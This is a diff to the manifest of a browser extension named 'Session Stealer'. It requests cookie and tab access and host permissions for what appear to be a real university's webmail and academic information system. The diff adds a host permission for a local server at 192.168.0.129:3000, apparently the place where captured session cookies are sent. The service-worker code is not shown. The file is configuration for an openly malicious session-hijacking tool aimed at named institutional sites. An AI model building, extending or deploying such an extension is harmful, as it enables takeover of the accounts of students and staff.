@@ -2,11 +2,15 @@
   "manifest_version": 3,
   "name": "Session Stealer",
   "version": "1.0",
-  "permissions": ["cookies", "tabs"],
+
+  "permissions": ["cookies", "tabs" ],
+
   "host_permissions": [
     "https://studentmail.ukf.sk/*",
-    "https://ais2.ukf.sk/ais/*"
+    "https://ais2.ukf.sk/*",
+    "http://192.168.0.129:3000/*"
   ],
+
   "background": {
     "service_worker": "service-worker.js"
   }
